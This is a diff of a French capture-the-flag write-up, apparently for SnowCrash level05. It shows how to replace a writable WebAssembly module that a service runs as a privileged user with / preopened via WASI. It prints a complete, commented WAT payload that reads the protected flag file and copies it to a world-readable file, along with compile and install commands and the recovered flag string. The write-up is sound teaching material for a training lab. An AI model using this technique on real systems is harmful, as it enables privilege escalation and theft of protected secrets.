@@ -1,229 +1,284 @@
-# Level05 — WebAssembly et WASI
+# Level05 — Exploiter un module WebAssembly modifiable
 
 ## Objectif
 
-Comprendre comment un service peut exécuter avec des privilèges élevés un module WebAssembly contrôlé par un autre utilisateur. Ce niveau reprend la frontière de confiance des niveaux précédents, mais le payload manipule explicitement la mémoire et les fonctions de fichiers fournies par WASI.
+Comprendre qu’un module WebAssembly modifiable devient dangereux lorsqu’un service le lance avec une identité plus privilégiée et lui donne accès au système de fichiers.
 
-## 1. Lire l’indice
-
-```bash
-cat README
-```
-
-Résultat :
+Le niveau peut se résumer ainsi :
 
 ```text
-The Metaverse runs on code. Code can be rewritten.
+level05 modifie un module WASM
+          │
+          ▼
+le service l’exécute comme flag05
+          │
+          ▼
+WASI lui donne accès à /
+          │
+          ▼
+le module lit le flag et l’écrit dans un fichier lisible
 ```
 
-L’indice suggère qu’un programme utilisé par le niveau peut être modifié.
+## 1. Identifier son environnement
 
-## 2. Identifier le module et le service
+```bash
+whoami
+id
+ls -la
+```
+
+`whoami` indique le compte utilisé, `id` affiche ses groupes et `ls -la` montre le contenu du dossier courant. La lecture du README n’étant pas possible ici, on part du nom du compte `level05` pour poursuivre la recherche.
+
+## 2. Trouver les fichiers du niveau
+
+Commencer par chercher le nom du niveau actuel :
+
+```bash
+find / -iname '*level05*' 2>/dev/null
+```
+
+Une piste à vérifier parmi les résultats est le dossier `/opt/snowcrash/level05`. Examiner son contenu :
+
+```bash
+ls -la /opt/snowcrash/level05
+```
+
+Si la liste contient `metaverse.wasm`, identifier sa nature :
+
+```bash
+file /opt/snowcrash/level05/metaverse.wasm
+```
+
+Les notes de résolution présentent ce fichier comme un module WebAssembly. La sortie exacte de `find`, de `ls` et de `file` reste à confirmer sur la VM.
+
+## 3. Vérifier que le module est modifiable
 
 ```bash
 id
-ls -la /opt/snowcrash/level05
+ls -l /opt/snowcrash/level05/metaverse.wasm
+```
+
+Ces deux commandes doivent être lues ensemble :
+
+- `id` liste les groupes de `level05` ;
+- `ls -l` donne le propriétaire, le groupe et les droits du module.
+
+Les notes de résolution indiquent que `level05` appartient au groupe `metaverse` et que ce groupe peut modifier `metaverse.wasm`. Les sorties exactes de `id` et de `ls -l` restent à relever sur la VM pour vérifier ces droits.
+
+À ce stade, nous savons seulement que `level05` contrôle le code du module. Cela ne suffit pas encore à lire `/home/flag05/.flag` : il faut savoir **qui exécute ce module** et **quels fichiers il peut atteindre**.
+
+## 4. Trouver le service qui exécute le module
+
+Le nom `metaverse.wasm` donne le mot-clé de recherche du service :
+
+```bash
+systemctl list-unit-files --all | grep -i metaverse
+```
+
+Le service identifié est `metaverse.service`. Lire sa définition :
+
+```bash
 systemctl cat metaverse.service
 ```
 
-Les observations conservées indiquent que :
+Dans cette sortie, chercher les informations suivantes :
 
-- `level05` appartient au groupe `metaverse` ;
-- ce groupe peut modifier `/opt/snowcrash/level05/metaverse.wasm` ;
-- `metaverse.service` exécute ce module sous l’identité `flag05` ;
-- le service rend la racine `/` accessible au module par l’intermédiaire de WASI.
+- `User=` : quelle identité exécute le service ? Les notes indiquent `flag05`.
+- `ExecStart=` : quelle commande est lancée ? Examiner aussi tout script qu’elle pourrait appeler avant de conclure quel module et quelles options sont utilisés.
 
-Le principe général est donc :
+Les notes indiquent que Wasmtime exécute `metaverse.wasm` avec la racine `/` préouverte. Si la commande effective contient `--dir=/`, cette option rend la racine accessible au module via WASI, sous réserve des permissions de l’utilisateur du service. La sortie exacte du service et, s’il y en a un, le contenu du script appelé restent à relever sur la VM.
+
+Si le service est exécuté par un timer, le repérer pour savoir quand le module sera relancé :
+
+```bash
+systemctl list-timers --all | grep -i metaverse
+```
+
+La chaîne suivante résume les observations rapportées ; il reste à les vérifier à l’aide des commandes ci-dessus :
 
 ```text
-level05 modifie metaverse.wasm
-                │
-                ▼
- metaverse.service exécute le module
-                │
-                ▼
-    WASI accède aux fichiers autorisés
-      avec les droits de flag05
+level05 peut remplacer metaverse.wasm
+                 │
+                 ▼
+metaverse.service le lance sous flag05
+                 │
+                 ▼
+Wasmtime préouvre /
+                 │
+                 ▼
+le module peut demander l’ouverture de home/flag05/.flag
 ```
 
-## 3. Comprendre les technologies utilisées
+## 5. Les termes utiles : WASM, WAT et WASI
 
-| Terme | Signification |
+| Terme | À retenir pour ce niveau |
 | --- | --- |
-| WASM | Format binaire WebAssembly exécuté par le service. |
-| WAT | Représentation textuelle et lisible d’un module WebAssembly. |
-| WASI | Interface qui fournit au module des fonctions système contrôlées, notamment pour les fichiers. |
-| Wasmtime | Environnement capable d’exécuter un module WebAssembly avec WASI. |
-| `wat2wasm` | Outil qui convertit un fichier WAT en module WASM. |
+| WASM | Le format binaire exécuté par le service : `metaverse.wasm`. |
+| WAT | La version textuelle et lisible d’un module WebAssembly. C’est le format dans lequel nous écrivons le payload. |
+| `wat2wasm` | L’outil qui convertit le fichier WAT en fichier WASM. |
+| WASI | L’interface par laquelle un module WASM peut demander des opérations telles que l’ouverture ou la lecture d’un fichier. |
+| Wasmtime | Le programme qui exécute le module et applique les autorisations WASI définies par le service. |
 
-L’environnement d’exécution définit les répertoires et les fonctions système accessibles au module WebAssembly. Dans ce niveau, la configuration rapportée préouvre `/`, ce qui rend le fichier du flag accessible au service.
+Un module WASM n’a pas accès aux fichiers par défaut. D’après les notes, Wasmtime lui ouvre ici l’accès à `/` : il faut confirmer l’option exacte dans la commande effective. Le point faible décrit par la solution associe un module modifiable, l’identité `flag05` et une racine préouverte trop large.
 
-## 4. Résumer l’algorithme
+## 6. Comprendre le but du payload avant son code
 
-Avant de lire le WAT, le comportement du [payload.wat](payload.wat) peut être résumé en quatre opérations :
+Un **payload** est le programme que nous choisissons de faire exécuter pour obtenir le résultat recherché. Ici, `level05` ne peut pas lire directement le flag. La solution consiste à remplacer le module utilisé par le service par notre propre module : lors du prochain lancement, ses instructions seront exécutées avec les droits du service.
+
+Le fichier [payload.wat](payload.wat) est la version lisible de ce programme. Son but tient en quatre actions :
 
 ```text
-ouvrir /home/flag05/.flag
-lire son contenu dans la mémoire du module
-ouvrir /opt/snowcrash/level05/x
-écrire dans x le nombre exact d’octets lus
+1. ouvrir home/flag05/.flag
+2. lire le flag dans la mémoire du module
+3. ouvrir opt/snowcrash/level05/x
+4. recopier le flag dans x
 ```
 
-La longueur du code vient surtout du fait que WebAssembly manipule explicitement les adresses, les structures en mémoire et les arguments de chaque fonction.
+Les chemins sont relatifs à `/`, le répertoire préouvert par Wasmtime. C’est pourquoi ils ne commencent pas par une barre oblique dans le WAT :
 
-## 5. Comprendre les imports WASI
+```text
+home/flag05/.flag          → /home/flag05/.flag
+opt/snowcrash/level05/x    → /opt/snowcrash/level05/x
+```
 
-Le module importe trois fonctions fournies par l’environnement WASI :
+La longueur du payload ne vient pas de ces quatre idées simples. Elle vient du fait que WASI demande au programme de fournir explicitement les adresses mémoire de ses chaînes, de ses tampons et de ses résultats.
+
+## 7. Lire le payload par étapes
+
+Le code ci-dessous reprend intégralement [payload.wat](payload.wat). Les explications après `;;` sont des commentaires : elles ne changent pas le comportement du programme.
+
+Pour le lire, il faut connaître trois choses :
+
+- WebAssembly utilise une **pile de valeurs** : `i32.const 64` place le nombre `64` sur la pile ; une instruction ou une fonction le récupère ensuite. `i32` et `i64` désignent des entiers de 32 et 64 bits.
+- Un **descripteur** est un numéro que le programme utilise pour désigner un fichier ouvert. Une **adresse** est un emplacement dans la mémoire du module : ce sont deux choses différentes, même si elles sont représentées par des nombres.
+- `i32.store` prend une adresse puis une valeur sur la pile et écrit la valeur à cette adresse ; `i32.load` lit la valeur enregistrée à l’adresse placée sur la pile.
 
 ```wat
-(import "wasi_snapshot_preview1" "path_open"
-  (func $path_open
-    (param i32 i32 i32 i32 i32 i64 i64 i32 i32)
-    (result i32)))
+(module  ;; Début du module WebAssembly.
 
-(import "wasi_snapshot_preview1" "fd_read"
-  (func $fd_read
-    (param i32 i32 i32 i32)
-    (result i32)))
+  ;; Demander à WASI la fonction qui ouvre un fichier.
+  (import "wasi_snapshot_preview1" "path_open"
+    ;; Neuf arguments : emplacement du chemin, droits demandés, etc.
+    ;; Le résultat i32 est un code d’erreur : 0 signifie succès.
+    (func $path_open (param i32 i32 i32 i32 i32 i64 i64 i32 i32) (result i32)))
 
-(import "wasi_snapshot_preview1" "fd_write"
-  (func $fd_write
-    (param i32 i32 i32 i32)
-    (result i32)))
+  ;; Demander la fonction qui lit un fichier dans la mémoire du module.
+  (import "wasi_snapshot_preview1" "fd_read"
+    (func $fd_read (param i32 i32 i32 i32) (result i32)))
+
+  ;; Demander la fonction qui écrit la mémoire du module dans un fichier.
+  (import "wasi_snapshot_preview1" "fd_write"
+    (func $fd_write (param i32 i32 i32 i32) (result i32)))
+
+  (memory (export "memory") 1)  ;; Réserver et exposer une page de 65 536 octets.
+  (data (i32.const 0) "home/flag05/.flag")  ;; Placer le chemin source à l’adresse 0.
+  (data (i32.const 32) "opt/snowcrash/level05/x")  ;; Chemin de sortie à l’adresse 32.
+
+  (func (export "_start")  ;; Point d’entrée : le runtime commence ici.
+
+    ;; 1. Ouvrir le flag en lecture avec path_open.
+    ;; Les neuf valeurs sont placées sur la pile dans l’ordre des arguments.
+    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
+    i32.const 0   ;; Options de résolution du chemin : aucune.
+    i32.const 0   ;; Adresse du chemin source dans la mémoire.
+    i32.const 17  ;; Longueur du chemin source en octets.
+    i32.const 0   ;; Options d’ouverture : ne pas créer ni tronquer.
+    i64.const 2   ;; Droit WASI demandé : lecture du fichier.
+    i64.const 0   ;; Droits héritables demandés : aucun.
+    i32.const 0   ;; Options du descripteur : aucune.
+    i32.const 80  ;; Adresse où WASI enregistrera le descripteur obtenu.
+    call $path_open  ;; Appeler WASI avec ces neuf arguments.
+    drop             ;; Retirer le code d’erreur sans le vérifier.
+
+    ;; 2. Préparer l’iovec : une description du tampon de lecture.
+    i32.const 64   ;; Adresse où enregistrer le début du tampon.
+    i32.const 128  ;; Le tampon lui-même commence à l’adresse 128.
+    i32.store      ;; Écrire 128 à l’adresse 64.
+
+    i32.const 68  ;; Adresse où enregistrer la taille du tampon.
+    i32.const 64  ;; Le tampon peut recevoir au maximum 64 octets.
+    i32.store     ;; Écrire la taille 64 à l’adresse 68.
+
+    i32.const 72  ;; Adresse réservée au nombre d’octets lus.
+    i32.const 0   ;; Valeur initiale : zéro.
+    i32.store     ;; Écrire 0 à l’adresse 72.
+
+    ;; 3. Lire le flag dans le tampon.
+    i32.const 80  ;; Adresse qui contient le descripteur du fichier source.
+    i32.load      ;; Charger ce descripteur pour le passer à fd_read.
+    i32.const 64  ;; Adresse de l’iovec : il décrit le tampon.
+    i32.const 1   ;; Nombre d’iovecs fournis : un seul.
+    i32.const 72  ;; Adresse où WASI écrira le nombre d’octets lus.
+    call $fd_read ;; Lire depuis le fichier source vers le tampon.
+    drop          ;; Retirer le code d’erreur sans le vérifier.
+
+    ;; 4. Ouvrir le fichier de sortie avec path_open.
+    i32.const 3   ;; Descripteur supposé du répertoire préouvert : /.
+    i32.const 0   ;; Options de résolution du chemin : aucune.
+    i32.const 32  ;; Adresse du chemin de sortie dans la mémoire.
+    i32.const 23  ;; Longueur du chemin de sortie en octets.
+    i32.const 9   ;; Options WASI : créer si absent et tronquer si présent.
+    i64.const 64  ;; Droit WASI demandé : écriture dans le fichier.
+    i64.const 0   ;; Droits héritables demandés : aucun.
+    i32.const 0   ;; Options du descripteur : aucune.
+    i32.const 84  ;; Adresse où WASI enregistrera le descripteur de sortie.
+    call $path_open  ;; Ouvrir le fichier de sortie.
+    drop             ;; Retirer le code d’erreur sans le vérifier.
+
+    ;; 5. Adapter la taille à la quantité réellement lue.
+    i32.const 68  ;; Adresse où se trouve la taille de l’iovec.
+    i32.const 72  ;; Adresse qui contient le nombre d’octets lus.
+    i32.load      ;; Charger ce nombre.
+    i32.store     ;; Le copier à l’adresse 68 à la place de 64.
+
+    ;; 6. Écrire le contenu du tampon dans le fichier de sortie.
+    i32.const 84   ;; Adresse qui contient le descripteur de sortie.
+    i32.load       ;; Charger ce descripteur pour le passer à fd_write.
+    i32.const 64   ;; Adresse de l’iovec : tampon et nouvelle taille.
+    i32.const 1    ;; Nombre d’iovecs fournis : un seul.
+    i32.const 76   ;; Adresse où WASI écrira le nombre d’octets écrits.
+    call $fd_write ;; Écrire le contenu du tampon dans le fichier de sortie.
+    drop           ;; Retirer le code d’erreur sans le vérifier.
+  )  ;; Fin de la fonction _start.
+)    ;; Fin du module.
 ```
 
-| Fonction | Rôle |
-| --- | --- |
-| `path_open` | Ouvrir un chemin et produire un descripteur de fichier. |
-| `fd_read` | Lire depuis un descripteur vers la mémoire. |
-| `fd_write` | Écrire depuis la mémoire vers un descripteur. |
+Après une lecture réussie, le flag se trouve dans la mémoire à partir de l’adresse `128`. Sa longueur est enregistrée à l’adresse `72` puis copiée à l’adresse `68`, pour demander à `fd_write` de n’écrire que les octets effectivement lus.
 
-`i32` et `i64` désignent respectivement des entiers de 32 et 64 bits. Les déclarations `param` décrivent les arguments attendus. Le `result i32` est un code d’erreur WASI ; le payload le supprime avec `drop` au lieu de le vérifier.
+Ce payload suppose que le descripteur `3` correspond à la racine préouverte. Il lit au maximum 64 octets, ignore les codes d’erreur et ne vérifie pas si l’écriture a été complète. La configuration du service reste à vérifier sur la VM.
 
-## 6. Comprendre l’organisation de la mémoire
+## 8. Compiler et installer le module
 
-Le module réserve une page mémoire WebAssembly, soit 65 536 octets, et y place deux chemins :
-
-```wat
-(memory (export "memory") 1)
-(data (i32.const 0) "home/flag05/.flag")
-(data (i32.const 32) "opt/snowcrash/level05/x")
-```
-
-Les chemins ne commencent pas par `/` parce qu’ils sont résolus relativement au répertoire préouvert par WASI, qui correspond ici à la racine.
-
-| Adresse | Contenu ou rôle |
-| ---: | --- |
-| `0` | Chemin source de 17 octets : `home/flag05/.flag`. |
-| `32` | Chemin de destination de 23 octets : `opt/snowcrash/level05/x`. |
-| `64` | Début de la structure `iovec` : adresse du tampon. |
-| `68` | Taille du tampon, ensuite remplacée par le nombre d’octets réellement lus. |
-| `72` | Nombre d’octets lus par `fd_read`. |
-| `76` | Nombre d’octets écrits par `fd_write`. |
-| `80` | Descripteur du fichier source. |
-| `84` | Descripteur du fichier de destination. |
-| `128` | Début du tampon qui reçoit le flag. |
-
-L’auteur du module a choisi ces adresses pour organiser la mémoire sans chevauchement entre les zones.
-
-## 7. Ouvrir le fichier source
-
-Le payload empile les arguments de `path_open`, puis appelle la fonction :
-
-```wat
-i32.const 3
-i32.const 0
-i32.const 0
-i32.const 17
-i32.const 0
-i64.const 2
-i64.const 0
-i32.const 0
-i32.const 80
-call $path_open
-drop
-```
-
-| Valeur | Paramètre représenté |
-| ---: | --- |
-| `3` | Descripteur du répertoire préouvert. |
-| `0` | Aucune option particulière de résolution du chemin. |
-| `0` | Adresse du chemin source en mémoire. |
-| `17` | Longueur du chemin `home/flag05/.flag`. |
-| `0` | Aucune option de création pour le fichier source. |
-| `2` | Droit WASI de lecture demandé. |
-| `0` | Aucun droit héritable supplémentaire. |
-| `0` | Aucune option particulière sur le descripteur. |
-| `80` | Adresse où WASI écrit le descripteur obtenu. |
-
-Le descripteur `3` dépend de la configuration du runtime. Il correspond ici au premier répertoire préouvert d’après le fonctionnement rapporté sur la VM ; cette hypothèse doit être reliée à la ligne de lancement exacte du service.
-
-## 8. Lire le contenu avec `fd_read`
-
-WASI utilise une structure appelée `iovec` pour décrire le tampon de lecture :
-
-```wat
-i32.const 64
-i32.const 128
-i32.store
-
-i32.const 68
-i32.const 64
-i32.store
-```
-
-La première partie place à l’adresse `64` un pointeur vers le tampon situé à l’adresse `128`. La seconde fixe à `64` octets la taille maximale de lecture.
-
-Le module charge ensuite le descripteur stocké à l’adresse `80`, appelle `fd_read` avec cette `iovec`, puis demande à WASI d’écrire à l’adresse `72` le nombre d’octets réellement lus.
-
-## 9. Ouvrir la destination et écrire le résultat
-
-La seconde utilisation de `path_open` ouvre `opt/snowcrash/level05/x` :
-
-- l’adresse du chemin est `32` et sa longueur est `23` ;
-- la valeur `9` combine les options WASI de création et de troncature ;
-- la valeur `64` demande le droit WASI d’écriture ;
-- le descripteur obtenu est stocké à l’adresse `84`.
-
-Avant d’appeler `fd_write`, le payload ajuste la taille de l’`iovec` :
-
-```wat
-i32.const 68
-i32.const 72
-i32.load
-i32.store
-```
-
-Cette séquence copie à l’adresse `68` le nombre d’octets réellement lus, enregistré à l’adresse `72`. Sans cet ajustement, le programme écrirait systématiquement 64 octets, y compris la partie inutilisée du tampon.
-
-`fd_write` écrit enfin les données du tampon vers le descripteur stocké à l’adresse `84` et place le nombre d’octets écrits à l’adresse `76`.
-
-## 10. Compiler et installer le payload
-
-Dans la session existante sous `level05`, créer `/tmp/payload.wat` et y coller le contenu exact de [payload.wat](payload.wat) :
+Dans la session existante sous `level05`, créer `/tmp/payload.wat` et y coller le contenu exact de [payload.wat](payload.wat).
 
 ```bash
 vi /tmp/payload.wat
 ```
 
-Vérifier ensuite l’état du fichier de sortie, puis le créer et préparer le module :
+Le fichier de sortie doit appartenir à `level05` et rester lisible après le passage du service. Le créer avant de lancer le service :
 
 ```bash
-ls -l /opt/snowcrash/level05/x
 touch /opt/snowcrash/level05/x
 chmod 666 /opt/snowcrash/level05/x
+```
+
+Compiler ensuite le WAT en WASM :
+
+```bash
 wat2wasm /tmp/payload.wat -o /tmp/payload.wasm
 ```
 
-Le mode `666` autorise ici la lecture et l’écriture pour tous les utilisateurs afin que `level05` et le service puissent utiliser le même fichier.
-
-Remplacer le contenu du module par le payload compilé :
+Puis remplacer le module traité par le service :
 
 ```bash
 cat /tmp/payload.wasm > /opt/snowcrash/level05/metaverse.wasm
 ```
 
-Après le passage du timer, lire la destination :
+`cat` ne lance pas le programme : il remplace seulement le contenu du module que le timer exécutera plus tard.
+
+## 9. Attendre le service puis lire le résultat
+
+Après le prochain passage du timer, lire le fichier de sortie :
 
 ```bash
 cat /opt/snowcrash/level05/x
@@ -235,7 +290,9 @@ Le secret récupéré est :
 viuaaale9huek52boumoomioc
 ```
 
-## 11. Passer à `level06`
+L’apparition du flag dans `x` confirme les trois éléments du raisonnement : le module remplacé a été exécuté, il a bénéficié des droits de `flag05` et WASI lui a donné accès au chemin du flag.
+
+## 10. Passer à `level06`
 
 ```bash
 su - level06
@@ -251,23 +308,12 @@ Résultat attendu : `level06`. Le passage au compte suivant a réussi avec la va
 
 ## Pourquoi cette méthode fonctionne
 
-Le timer lance avec les droits de `flag05` un module WASM modifiable par `level05`. Le service lui accorde en plus un accès WASI à la racine. Le payload peut donc demander au runtime d’ouvrir le flag, de le lire en mémoire et de l’écrire dans un fichier accessible.
-
-La faille résulte de la combinaison d’un module modifiable, d’une identité privilégiée et de ressources WASI trop largement exposées.
-
-## Limites du payload
-
-- Les codes d’erreur de `path_open`, `fd_read` et `fd_write` sont ignorés avec `drop`.
-- Le tampon limite la lecture à 64 octets.
-- Le descripteur `3` suppose l’ordre de préouverture observé dans cette configuration WASI.
-- Les chemins et les longueurs sont codés en dur.
-
-Ce module volontairement minimal est adapté au puzzle. Son fonctionnement et le passage à `level06` sont rapportés comme confirmés sur la VM ; le dépôt conserve le résultat, tandis que les sorties originales de compilation et d’exécution restent à ajouter.
+`level05` ne peut pas lire directement `/home/flag05/.flag`. En revanche, il peut modifier le module que le service exécute. Le service donne ensuite à ce code les droits de `flag05` et l’accès WASI à `/`. Le module peut donc ouvrir le flag, le lire et le recopier dans `x`.
 
 ## À expliquer à l’évaluation
 
-> Le service exécute sous `flag05` un module WASM modifiable par `level05` et lui préouvre la racine via WASI. Mon module ouvre le flag, le lit dans un tampon, ouvre un fichier de sortie puis y écrit exactement le nombre d’octets lus.
+> J’ai trouvé un module WebAssembly modifiable par `level05`. Le service l’exécute sous `flag05` avec la racine préouverte via WASI. J’ai remplacé ce module par un programme WAT qui ouvre le flag, le lit en mémoire puis l’écrit dans un fichier accessible à `level05`.
 
 ## Traçabilité à conserver
 
-Conserver la sortie de `systemctl cat`, les permissions de `metaverse.wasm`, la configuration des répertoires WASI préouverts, la sortie de `wat2wasm`, les passages du timer et le résultat de `id -un` après validation.
+Conserver les sorties de `find`, `ls -la`, `file`, `id`, `ls -l`, `systemctl list-unit-files`, `systemctl cat`, `systemctl list-timers`, `wat2wasm`, `cat x` et `id -un`.
